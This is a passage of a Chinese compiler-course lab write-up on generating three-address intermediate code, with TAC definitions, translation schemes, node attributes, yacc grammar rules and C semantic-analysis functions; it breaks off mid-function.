<p>中间语言（中间代码）是一种面向语法，易于翻译成目标程序的等效内部表示代码（二进制码）</p>
<p>其可理解性及易于生成目标代码的程度介于源语言和目标语言之间 </p>
<p>三地址中间代码 TAC 是一个4元组，逻辑上包含 <code>(op、opn1、opn2、result)</code>：</p>
<ul>
<li>op：表示操作类型说明</li>
<li>opn1 和 opn2：表示2个操作数</li>
<li>result：表示运算结果</li>
</ul>
<p>后续还需要根据 TAC 序列生成目标代码，所以设计其存储结构时，每一部分要考虑目标代码生成时所需要的信息</p>
<p>表 4-1 中间代码定义：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>语法</strong></th>
<th><strong>描述</strong></th>
<th><strong>Op</strong></th>
<th><strong>Opn1</strong></th>
<th><strong>Opn2</strong></th>
<th><strong>Result</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>LABEL x</td>
<td>定义标号 x</td>
<td>LABEL</td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>FUNCTION f:</td>
<td>定义函数 f</td>
<td>FUNCTION</td>
<td></td>
<td></td>
<td>F</td>
</tr>
<tr>
<td>x := y</td>
<td>赋值操作</td>
<td>ASSIGN</td>
<td>X</td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>x := y + z</td>
<td>加法操作</td>
<td>PLUS</td>
<td>Y</td>
<td>Z</td>
<td>X</td>
</tr>
<tr>
<td>x := y - z</td>
<td>减法操作</td>
<td>MINUS</td>
<td>Y</td>
<td>Z</td>
<td>X</td>
</tr>
<tr>
<td>x := y * z</td>
<td>乘法操作</td>
<td>STAR</td>
<td>Y</td>
<td>Z</td>
<td>X</td>
</tr>
<tr>
<td>x := y / z</td>
<td>除法操作</td>
<td>DIV</td>
<td>Y</td>
<td>Z</td>
<td>X</td>
</tr>
<tr>
<td>GOTO x</td>
<td>无条件转移</td>
<td>GOTO</td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>IF x [relop] y GOTO z</td>
<td>条件转移</td>
<td>[relop]</td>
<td>X</td>
<td>Y</td>
<td>Z</td>
</tr>
<tr>
<td>RETURN x</td>
<td>返回语句</td>
<td>RETURN</td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>ARG x</td>
<td>传实参 x</td>
<td>ARG</td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>x:=CALL f</td>
<td>调用函数</td>
<td>CALL</td>
<td>F</td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>PARAM x</td>
<td>函数形参</td>
<td>PARAM</td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>READ x</td>
<td>读入</td>
<td>READ</td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td>WRITE x</td>
<td>打印</td>
<td>WRITE</td>
<td></td>
<td></td>
<td>X</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>运算符：<ul>
<li>表示这条指令需要完成的运算，可以用枚举常量表示，如 PLUS 表示双目加，JLE 表示小于等于，PARAM 表示形参，ARG 表示实参等</li>
</ul>
</li>
<li>操作数与运算结果：<ul>
<li>这些部分包含的数据类型有多种，整常量，实常量，还有使用标识符的情况，如变量的别名、变量在其数据区的偏移量和层号、转移语句中的标号等</li>
<li>类型不同，所以考虑使用联合，为了明确联合中的有效成员，将操作数与运算结果设计成结构类型，包含 kind，联合等几个成员，kind 说明联合中的有效，联合成员是整常量，实常量或标识符表示的别名或标号或函数名等</li>
</ul>
</li>
<li>为了配合后续的 TAC 代码序列的生成，将 TAC 代码作为数据元素，用双向循环链表表示 TAC 代码序列</li>
</ul>
<p><strong>翻译模式</strong></p>
<p>翻译模式：把语义规则（也称为语义动作），用花括号 <code>&#123;&#125;</code> 括起来，插入到产生式右部的合适位置上，进一步细化了语义计算的时机 </p>
<p>翻译模式用于指明各个符号的具体含义，当 “词法分析” 和 “语法分析” 都执行完毕以后，程序便会开始 “语义分析”，其大概包含以下两个步骤：</p>
<ul>
<li>生成符号表，并进行：重复检查，未声明/定义检查，类型匹配检查</li>
<li>为 AST 的各个节点类型编写“含义”（根据翻译模式对各个节点的意义进行解释）</li>
</ul>
<p>翻译模式共有两种：</p>
<ul>
<li>S-翻译模式：<ul>
<li>只涉及到综合属性，语义动作集置于产生式右端的末尾</li>
<li>常采用 LR 的自底向上的分析法，和S-属性文法类似</li>
</ul>
</li>
<li>L-翻译模式：<ul>
<li>包含综合属性，也可以包含继承属性</li>
<li>必须满足以下条件：<ul>
<li>产生式右部符号的继承属性，其语义计算必须位于该符号前，且语义动作不访问右边符号的属性</li>
<li>产生式左部符号的综合属性只有在它所引用的所有属性都计算出来之后才可以计算，计算这种属性的动作通常放在产生式的末尾</li>
<li>继承属性只能依赖于兄长的属性、父亲的继承属性、自身的属性</li>
<li>属性间的依赖图不能形成环路</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>本实验将会采用S-翻译模式和 LR(1) 文法：</p>
<ul>
<li>基础文法 LL(1)：自顶向下计算</li>
<li>基础文法 LR(1)：自底向上计算</li>
</ul>
<p><strong>属性计算</strong></p>
<p>在遍历过程中，需要根据翻译模式给出的计算方法完成属性的计算，本实验中设置的属性如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span>                     </span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">int</span> level;                  <span class="comment">// 层号</span></span><br><span class="line">    <span class="keyword">int</span> place;                  <span class="comment">// 表示结点对应的变量或运算结果符号表的位置序号</span></span><br><span class="line">    <span class="keyword">char</span> Etrue[<span class="number">15</span>], Efalse[<span class="number">15</span>]; <span class="comment">// 对布尔表达式的翻译时，真假转移目标的标号</span></span><br><span class="line">    <span class="keyword">char</span> Snext[<span class="number">15</span>];             <span class="comment">// 该结点对饮语句执行后的下一条语句位置标号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">codenode</span> *<span class="title">code</span>;</span>      <span class="comment">// 该结点中间代码链表头指针</span></span><br><span class="line">    <span class="keyword">char</span> op[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> type;   <span class="comment">// 结点对应值的类型</span></span><br><span class="line">    <span class="keyword">int</span> pos;    <span class="comment">// 语法单位所在位置行号</span></span><br><span class="line">    <span class="keyword">int</span> offset; <span class="comment">// 偏移量</span></span><br><span class="line">    <span class="keyword">int</span> width;  <span class="comment">// 占数据字节数</span></span><br><span class="line">    <span class="keyword">int</span> num;	<span class="comment">// 记录个数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>.place</strong>：记录该结点操作数在符号表中的位置序号，每次完成了计算后，中间结果需要用一个临时变量保存，临时变量也需要登记到符号表中（返回局部变量会生成一个临时变量，即没有名字的变量）</li>
<li><strong>.type</strong>：记录数据的类型，用于表达式的计算中，该属性也可用于语句，表示语句语义分析的正确性（OK或ERROR）</li>
<li><strong>.offset</strong>：记录外部变量在静态数据区中的偏移量，以及局部变量和临时变量在活动记录中的偏移量（另外对函数，这项保存活动记录的大小）</li>
<li><strong>.width</strong>：记录一个结点表示的语法单位中，定义的变量和临时单元所需要占用的字节数，方便计算变量、临时变量在活动记录中偏移量，以及最后计算函数活动记录的大小</li>
<li><strong>.code</strong>：记录中间代码序列的起始位置，如采用链表表示中间代码序列，该属性就是一个链表的头指针</li>
<li><strong>.Etrue</strong> 和 <strong>.Efalse</strong>：在完成布尔表达式翻译时，表达式值为真假时要转移的程序位置（标号的字符串形式）</li>
<li><strong>.Snext</strong>：该结点的语句序列执行完后，要转移的程序位置（标号的字符串形式）</li>
</ul>
<p>这一步非常复杂，如果有必要的话，我们需要对每个类型的节点都设置一个函数，用于解析它本身的语义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">semantic_Analysis</span><span class="params">(struct node *T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (T-&gt;kind)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> EXT_DEF_LIST: <span class="comment">// 外部定义列表</span></span><br><span class="line">            ext_def_list(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXT_VAR_DEF: <span class="comment">// 外部变量声明</span></span><br><span class="line">            ext_var_def(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FUNC_DEF: <span class="comment">// 函数定义</span></span><br><span class="line">            func_def(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FUNC_DEC: <span class="comment">// 函数声明</span></span><br><span class="line">            func_dec(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PARAM_LIST: <span class="comment">// 参数定义列表</span></span><br><span class="line">            param_list(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PARAM_DEC: <span class="comment">// 参数定义</span></span><br><span class="line">            param_dec(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> COMP_STM: <span class="comment">// 复合语句</span></span><br><span class="line">            comp_stm(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DEF_LIST: <span class="comment">// 定义列表</span></span><br><span class="line">            def_list(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VAR_DEF: <span class="comment">// 定义</span></span><br><span class="line">            var_def(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> STM_LIST: <span class="comment">// 语句列表</span></span><br><span class="line">            stmt_list(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IF_THEN: <span class="comment">// IF ELSE-IF语句</span></span><br><span class="line">            if_then(T);</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> IF_THEN_ELSE: <span class="comment">// IF ELSE语句</span></span><br><span class="line">            if_then_else(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WHILE: <span class="comment">// WHILE语句</span></span><br><span class="line">            while_dec(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FOR: <span class="comment">// FOR语句(改动)</span></span><br><span class="line">            for_dec(T);</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">case</span> FOR_DEC: <span class="comment">// FOR语句列表(新添)</span></span><br><span class="line">            for_list(T);</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> EXP_STMT: <span class="comment">// 表达式语句</span></span><br><span class="line">            exp_stmt(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> RETURN: <span class="comment">// 返回</span></span><br><span class="line">            return_dec(T);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ID:</span><br><span class="line">        <span class="keyword">case</span> STRUCT_TAG: <span class="comment">// 结构体(新添)</span></span><br><span class="line">        <span class="keyword">case</span> INT:</span><br><span class="line">        <span class="keyword">case</span> FLOAT:</span><br><span class="line">        <span class="keyword">case</span> CHAR:</span><br><span class="line">        <span class="keyword">case</span> STRING:</span><br><span class="line">        <span class="keyword">case</span> ASSIGNOP:</span><br><span class="line">        <span class="keyword">case</span> AND:</span><br><span class="line">        <span class="keyword">case</span> OR:</span><br><span class="line">        <span class="keyword">case</span> RELOP:</span><br><span class="line">        <span class="keyword">case</span> PLUS:</span><br><span class="line">        <span class="keyword">case</span> PPLUS: <span class="comment">// 加加(改名)</span></span><br><span class="line">        <span class="keyword">case</span> PLUSASSIGNOP: <span class="comment">// 加等于(改名)</span></span><br><span class="line">        <span class="keyword">case</span> MINUS:</span><br><span class="line">        <span class="keyword">case</span> MMINUS: <span class="comment">// 减减(改名)</span></span><br><span class="line">        <span class="keyword">case</span> MINUSASSIGNOP: <span class="comment">// 减等于(改名)</span></span><br><span class="line">        <span class="keyword">case</span> STAR:</span><br><span class="line">        <span class="keyword">case</span> STARASSIGNOP: <span class="comment">// 乘等于(改名)</span></span><br><span class="line">        <span class="keyword">case</span> DIV:</span><br><span class="line">        <span class="keyword">case</span> DIVASSIGNOP: <span class="comment">// 除等于(改名)</span></span><br><span class="line">        <span class="keyword">case</span> NOT:</span><br><span class="line">        <span class="keyword">case</span> UMINUS:</span><br><span class="line">        <span class="keyword">case</span> FUNC_CALL:</span><br><span class="line">        <span class="keyword">case</span> EXP_ARRAY:</span><br><span class="line">            Exp(T); <span class="comment">//处理基本表达式</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>上述展示的节点类型并不完整，有些类型的处理函数会出现在其子函数中</li>
</ul>
<p>这里要补充一下：和上个实验相比，新填了3个节点：</p>
<ul>
<li>STRUCT_TAG：结构体名称</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OptTag	: &#123;$$=<span class="literal">NULL</span>;&#125;</span><br><span class="line">		| ID &#123;$$=mknode(STRUCT_TAG,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;struct_name,$<span class="number">1</span>);&#125;</span><br><span class="line">		;</span><br><span class="line">Tag	: ID &#123;$$=mknode(STRUCT_TAG,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;struct_name,$<span class="number">1</span>);&#125;</span><br><span class="line">	;</span><br></pre></td></tr></table></figure>
<ul>
<li>STRUCT_DEF：结构体定义</li>
<li>STRUCT_DEC：结构体声明</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StructSpecifier : STRUCT OptTag LC DefList RC &#123;$$=mknode(STRUCT_DEF,$<span class="number">2</span>,$<span class="number">4</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">			   | STRUCT Tag  &#123;$$=mknode(STRUCT_DEC,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">			   ;</span><br></pre></td></tr></table></figure>
<p>修改了1个节点：（另外几个只是改了名字，代码没有变）</p>
<ul>
<li>FOR：FOR 语句</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Stmt:   Exp SEMI    &#123;$$=mknode(EXP_STMT,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | CompSt      &#123;$$=$<span class="number">1</span>;&#125;     </span><br><span class="line">      | RETURN Exp SEMI   &#123;$$=mknode(RETURN,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt %prec LOWER_THEN_ELSE   &#123;$$=mknode(IF_THEN,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt ELSE Stmt   &#123;$$=mknode(IF_THEN_ELSE,$<span class="number">3</span>,$<span class="number">5</span>,$<span class="number">7</span>,yylineno);&#125;</span><br><span class="line">      | WHILE LP Exp RP Stmt &#123;$$=mknode(WHILE,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | FOR LP ForDec RP Stmt &#123;$$=mknode(FOR,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br></pre></td></tr></table></figure>
<ul>
<li>ForDec：FOR 语句列表</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ForDec: Exp SEMI Exp SEMI Exp &#123;$$=mknode(FOR_DEC,$<span class="number">1</span>,$<span class="number">3</span>,$<span class="number">5</span>,yylineno);&#125;</span><br><span class="line">       | SEMI Exp SEMI &#123;$$=mknode(FOR_DEC,<span class="literal">NULL</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">       ;</span><br></pre></td></tr></table></figure>
<p><strong>中间代码的生成</strong></p>
<p>核心结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">codenode</span></span></span><br><span class="line"><span class="class">&#123;</span>   <span class="comment">/* 三地址TAC代码结点 */</span></span><br><span class="line">    <span class="keyword">int</span> op;                        <span class="comment">// TAC代码的运算符种类</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">opn</span> <span class="title">opn1</span>, <span class="title">opn2</span>, <span class="title">result</span>;</span> <span class="comment">// 2个操作数和运算结果</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">codenode</span> *<span class="title">next</span>, *<span class="title">prior</span>;</span> <span class="comment">// 采用双向循环链表存放中间语言代码</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于描述操作数的结构体如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">opn</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> kind; <span class="comment">// 标识操作的类型</span></span><br><span class="line">    <span class="keyword">int</span> type; <span class="comment">// 标识操作数的类型</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> const_int;     <span class="comment">// 整常数值,立即数</span></span><br><span class="line">        <span class="keyword">float</span> const_float; <span class="comment">// 浮点常数值,立即数</span></span><br><span class="line">        <span class="keyword">char</span> const_char;   <span class="comment">// 字符常数值,立即数</span></span><br><span class="line">        <span class="keyword">char</span> *const_string;</span><br><span class="line">        <span class="keyword">char</span> id[<span class="number">33</span>]; <span class="comment">// 变量或临时变量的别名或标号字符串</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Array</span> *<span class="title">type_array</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Struct</span> *<span class="title">type_struct</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> level;  <span class="comment">// 变量的层号,0表示是全局变量,数据保存在静态数据区</span></span><br><span class="line">    <span class="keyword">int</span> offset; <span class="comment">// 变量单元偏移量,或函数在符号表的定义位置序号,目标代码生成时用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>中间代码生成的过程其实就是完成 <code>codenode</code> 双向链表，其中的 <code>opn1, opn2, result</code> 需要根据 “表 4-1 中间代码定义” 来进行填写</p>
<p>接下来就按照逻辑顺序，依次展示各个节点的中间代码的生成过程</p>
<p><strong>全局变量定义</strong>（本实验的外部变量就是全局变量）</p>
<p>EXT_DEF_LIST：外部定义列表（EXT_VAR_DEF | ARRAY_DEF | FUNC_DEF，EXT_DEF_LIST）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ext_def_list</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!T-&gt;ptr[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset; <span class="comment">// 语义分析之前先设置偏移地址</span></span><br><span class="line">    semantic_Analysis(T-&gt;ptr[<span class="number">0</span>]); <span class="comment">// 访问外部定义列表中的第一个</span></span><br><span class="line">    T-&gt;code = T-&gt;ptr[<span class="number">0</span>]-&gt;code; <span class="comment">// 之后会合并code</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (T-&gt;ptr[<span class="number">1</span>]) <span class="comment">/* 第2棵子树指向下一个EXT_DEF_LIST节点,可为NULL */</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;ptr[<span class="number">0</span>]-&gt;offset + T-&gt;ptr[<span class="number">0</span>]-&gt;width;</span><br><span class="line">        semantic_Analysis(T-&gt;ptr[<span class="number">1</span>]); <span class="comment">// 访问该外部定义列表中的其它外部定义</span></span><br><span class="line">        T-&gt;code = merge(<span class="number">2</span>, T-&gt;code, T-&gt;ptr[<span class="number">1</span>]-&gt;code); <span class="comment">// 合并code</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>merge</code>：合并多个中间代码的双向循环链表，首尾相连</li>
</ul>
<p>EXT_VAR_DEF：外部变量声明（TYPE，EXT_DEC_LIST）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ext_var_def</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;type_id, <span class="string">&quot;int&quot;</span>)) <span class="comment">/* 变量类型判断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;type = T-&gt;ptr[<span class="number">1</span>]-&gt;type = INT;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;width = <span class="number">4</span>; <span class="comment">/* 解释该类型的实际大小 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;type_id, <span class="string">&quot;float&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;type = T-&gt;ptr[<span class="number">1</span>]-&gt;type = FLOAT;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;width = <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(T-&gt;ptr[<span class="number">0</span>]-&gt;type_id, <span class="string">&quot;char&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        T-&gt;type = T-&gt;ptr[<span class="number">1</span>]-&gt;type = CHAR;</span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;width = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset; 				<span class="comment">// 这个外部变量的偏移量向下传递</span></span><br><span class="line">    ext_var_list(T-&gt;ptr[<span class="number">1</span>]);                        <span class="comment">// 处理外部变量中的标识符序列</span></span><br><span class="line">    T-&gt;width = (T-&gt;ptr[<span class="number">1</span>]-&gt;width) * T-&gt;ptr[<span class="number">1</span>]-&gt;num; <span class="comment">// 计算这个外部变量声明的宽度</span></span><br><span class="line">    T-&gt;code = <span class="literal">NULL</span>;                                 <span class="comment">// 这里假定外部变量不支持初始化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>EXT_DEC_LIST 节点中可能记录了类型相同的多个变量声明，需要递归处理</li>
<li>假定全局变量不支持初始化，因此不需要设置中间代码 <code>code</code></li>
</ul>
<p>EXT_DEC_LIST：变量名称列表（ID，EXT_DEC_LIST）</p>
<p>ID：变量名称（ID）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ext_var_list</span><span class="params">(struct node *T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rtn, num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span> (T-&gt;kind)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> EXT_DEC_LIST: <span class="comment">/* EXT_DEC_LIST节点必然存在两棵子树 */</span></span><br><span class="line">        T-&gt;ptr[<span class="number">0</span>]-&gt;type = T-&gt;type;                <span class="comment">//将类型属性向下传递变量结点</span></span><br><span class="line">        T-&gt;ptr[<span class="number">0</span>]-&gt;offset = T-&gt;offset;            <span class="comment">//外部变量的偏移量向下传递</span></span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;type = T-&gt;type;                <span class="comment">//将类型属性向下传递变量结点</span></span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;offset = T-&gt;offset + T-&gt;width; <span class="comment">//外部变量的偏移量向下传递</span></span><br><span class="line">        T-&gt;ptr[<span class="number">1</span>]-&gt;width = T-&gt;width;</span><br><span 